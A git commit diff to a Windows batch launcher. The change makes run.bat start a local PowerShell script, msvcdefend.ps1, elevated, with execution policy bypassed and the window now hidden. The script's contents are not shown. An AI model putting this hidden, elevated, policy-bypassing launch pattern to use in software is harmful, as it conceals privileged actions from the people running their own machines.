5af7af132ecf65170f97a7153be798eab7a90b98
0xhex0rc1st <0xhex0rc1st@gmail.com>
2026-01-31 21:29:20 +0330

    Update run.bat

--- run.bat
+++ run.bat
@@ -1,2 +1,2 @@
 @echo off
-PowerShell -Command "Start-Process PowerShell -ArgumentList '-ExecutionPolicy Bypass -File \"%~dp0msvcdefend.ps1\"' -Verb RunAs"
+PowerShell -Command "Start-Process PowerShell -WindowStyle Hidden -ArgumentList '-ExecutionPolicy Bypass -File \"%~dp0msvcdefend.ps1\"' -Verb RunAs"
